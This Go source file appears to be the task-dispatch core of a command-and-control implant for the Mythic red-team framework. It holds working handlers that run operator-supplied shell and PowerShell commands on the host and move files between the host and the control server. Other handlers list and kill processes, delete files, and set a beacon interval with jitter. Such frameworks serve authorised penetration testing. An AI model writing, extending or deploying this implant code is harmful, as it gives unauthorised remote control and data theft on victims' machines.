package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// commandEntry is one row of the dispatch table. To add a command, add a
// row plus a handler here, register it in the container commandSpecs and
// add it to the C table in agent_code_c/tasks.c. Handlers return the
// response body; dispatch fills TaskID and Completed.
type commandEntry struct {
	name string
	run  func(a *Agent, t Task) (Response, bool)
}

// Built in init: load/unload handlers reference the table, so a package
// var initializer would be an initialization cycle.
var commandTable []commandEntry

func init() {
	commandTable = []commandEntry{
		{name: "shell", run: handleShell},
		{name: "powershell", run: handlePowershell},
		{name: "sleep", run: handleSleep},
		{name: "ls", run: handleLs},
		{name: "download", run: handleDownload},
		{name: "upload", run: handleUpload},
		{name: "rm", run: handleRm},
		{name: "mkdir", run: handleMkdir},
		{name: "ps", run: handlePs},
		{name: "kill", run: handleKill},
		{name: "load", run: handleLoad},
		{name: "unload", run: handleUnload},
		{name: "exit", run: handleExit},
	}
}

// dispatch runs one task and reports whether the agent must exit afterwards.
func (a *Agent) dispatch(t Task) (Response, bool) {
	entry := findCommand(t.Command)
	if entry == nil {
		out := "error: unknown command " + t.Command
		return Response{TaskID: t.ID, Completed: true, Status: out, UserOutput: out}, false
	}
	if !commandAllowed(t.Command) {
		out := "error: command " + t.Command + " not included in this build"
		return Response{TaskID: t.ID, Completed: true, Status: out, UserOutput: out}, false
	}
	resp, exit := entry.run(a, t)
	resp.TaskID, resp.Completed = t.ID, true
	return resp, exit
}

func findCommand(name string) *commandEntry {
	for i := range commandTable {
		if commandTable[i].name == name {
			return &commandTable[i]
		}
	}
	return nil
}

// allowedCache is the runtime command allowlist, seeded from the
// build-time list. load/unload flip entries; the cache rebuilds if the
// build list changes under it (tests).
var (
	allowedCache map[string]bool
	allowedCSV   string
)

// commandAllowed reports whether name may run right now. An empty
// build list (offline builds without -X) allows everything.
func commandAllowed(name string) bool {
	if allowedCache == nil || allowedCSV != includedCommands {
		allowedCache = buildAllowed(includedCommands)
		allowedCSV = includedCommands
	}
	return allowedCache[name]
}

func buildAllowed(csv string) map[string]bool {
	m := map[string]bool{}
	if strings.TrimSpace(csv) == "" {
		for i := range commandTable {
			m[commandTable[i].name] = true
		}
		return m
	}
	for _, c := range strings.Split(csv, ",") {
		if n := strings.TrimSpace(c); n != "" {
			m[n] = true
		}
	}
	return m
}

// setCommandAllowed flips one command at runtime, false when unknown.
func setCommandAllowed(name string, allowed bool) bool {
	if findCommand(name) == nil {
		return false
	}
	commandAllowed(name) // ensure initialized
	allowedCache[name] = allowed
	return true
}

// protectedRuntime mirrors the container: unloading these would strand
// the callback.
func protectedRuntime(name string) bool {
	return name == "exit" || name == "load" || name == "unload"
}

func oneArtifact(base, artifact string) *[]Artifact {
	return &[]Artifact{{BaseArtifact: base, Artifact: artifact}}
}

func errResponse(err error) (Response, bool) {
	out := "error: " + err.Error()
	return Response{UserOutput: out, Status: out}, false
}

func handleShell(_ *Agent, t Task) (Response, bool) {
	arg := taskArg(t.Parameters)
	out, err := runShell(arg)
	resp := Response{UserOutput: out, Artifacts: oneArtifact("Process Create", "cmd.exe /c "+arg)}
	if err != nil {
		resp.Status = "error: " + err.Error()
		return resp, false
	}
	resp.Status = "success"
	return resp, false
}

func handlePowershell(_ *Agent, t Task) (Response, bool) {
	arg := taskArg(t.Parameters)
	out, err := runPowershell(arg)
	resp := Response{UserOutput: out, Artifacts: oneArtifact("Process Create", "powershell.exe /c "+arg)}
	if err != nil {
		resp.Status = "error: " + err.Error()
		return resp, false
	}
	resp.Status = "success"
	return resp, false
}

func handleSleep(a *Agent, t Task) (Response, bool) {
	interval, jitter, err := parseSleep(taskArg(t.Parameters))
	if err != nil {
		return errResponse(err)
	}
	a.interval, a.jitter = interval, jitter
	return Response{
		UserOutput: fmt.Sprintf("sleep set to %ds jitter %d%%", interval, jitter),
		Status:     "success",
	}, false
}

func handleLs(_ *Agent, t Task) (Response, bool) {
	text, fb, err := listDir(taskArg(t.Parameters))
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: text, Status: "success", FileBrowser: fb}, false
}

func handleDownload(a *Agent, t Task) (Response, bool) {
	arg := taskArg(t.Parameters)
	out, err := downloadToMythic(t.ID, arg, a.chunkSize(), a.posterFor())
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success", Artifacts: oneArtifact("File Download", arg)}, false
}

func handleUpload(a *Agent, t Task) (Response, bool) {
	remote := taskParam(t.Parameters, "remote_path")
	out, err := uploadFromMythic(t.ID, taskParam(t.Parameters, "file"),
		remote, a.chunkSize(), a.posterFor())
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success", Artifacts: oneArtifact("File Upload", remote)}, false
}

func handleRm(_ *Agent, t Task) (Response, bool) {
	arg := taskArg(t.Parameters)
	removed, out, err := removePath(arg)
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success",
		RemovedFiles: &removed, Artifacts: oneArtifact("File Delete", arg)}, false
}

func handleMkdir(_ *Agent, t Task) (Response, bool) {
	out, err := makeDir(taskArg(t.Parameters))
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success"}, false
}

func handlePs(_ *Agent, _ Task) (Response, bool) {
	entries, err := listProcesses()
	if err != nil {
		return errResponse(err)
	}
	procs := processesPayload(entries)
	return Response{UserOutput: psText(entries), Status: "success", Processes: &procs}, false
}

func handleKill(_ *Agent, t Task) (Response, bool) {
	pid, err := parseKillArg(taskArg(t.Parameters))
	if err != nil {
		return errResponse(err)
	}
	if err := killProcess(pid); err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: fmt.Sprintf("killed %d", pid), Status: "success",
		Artifacts: oneArtifact("Process Kill", fmt.Sprintf("pid %d", pid))}, false
}

func handleLoad(_ *Agent, t Task) (Response, bool) {
	name := strings.TrimSpace(taskArg(t.Parameters))
	if !setCommandAllowed(name, true) {
		return errResponse(fmt.Errorf("unknown command %s", name))
	}
	return Response{UserOutput: fmt.Sprintf("loaded %s", name), Status: "success"}, false
}

func handleUnload(_ *Agent, t Task) (Response, bool) {
	name := strings.TrimSpace(taskArg(t.Parameters))
	if protectedRuntime(name) {
		return errResponse(fmt.Errorf("cannot unload %s", name))
	}
	if !setCommandAllowed(name, false) {
		return errResponse(fmt.Errorf("unknown command %s", name))
	}
	return Response{UserOutput: fmt.Sprintf("unloaded %s", name), Status: "success"}, false
}

func handleExit(_ *Agent, _ Task) (Response, bool) {
	return Response{UserOutput: "exiting", Status: "success"}, true
}

func runShell(arg string) (string, error) {
	name, flag := "cmd.exe", "/c"
	if runtime.GOOS != "windows" {
		name, flag = "sh", "-c"
	}
	return runCmd(name, flag, arg)
}

func runPowershell(arg string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("powershell needs Windows")
	}
	return runCmd("powershell.exe", "/c", arg)
}

func runCmd(name, flag, arg string) (string, error) {
	cmd := exec.Command(name, flag, arg)
	cmd.Env = os.Environ()
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// parseSleep reads "interval [jitter]" in seconds, e.g. "60 10".
func parseSleep(arg string) (int, int, error) {
	fields := strings.Fields(arg)
	if len(fields) == 0 || len(fields) > 2 {
		return 0, 0, fmt.Errorf("usage: sleep <interval> [jitter]")
	}
	interval, err := strconv.Atoi(fields[0])
	if err != nil || interval < 0 {
		return 0, 0, fmt.Errorf("bad interval %q", fields[0])
	}
	jitter := 0
	if len(fields) == 2 {
		jitter, err = strconv.Atoi(fields[1])
		if err != nil || jitter < 0 || jitter > 100 {
			return 0, 0, fmt.Errorf("bad jitter %q", fields[1])
		}
	}
	return interval, jitter, nil
}

// sleepTime mirrors Thanatos: interval plus/minus jitter percent.
func sleepTime(interval, jitter int) time.Duration {
	if interval <= 0 {
		return 0
	}
	if jitter <= 0 {
		return time.Duration(interval) * time.Second
	}
	delta := interval * jitter / 100
	low := interval - delta
	if low < 0 {
		low = 0
	}
	n := low
	if span := interval + delta - low; span > 0 {
		n = low + rand.Intn(span+1) //nolint:gosec // jitter needs no CSPRNG
	}
	return time.Duration(n) * time.Second
}
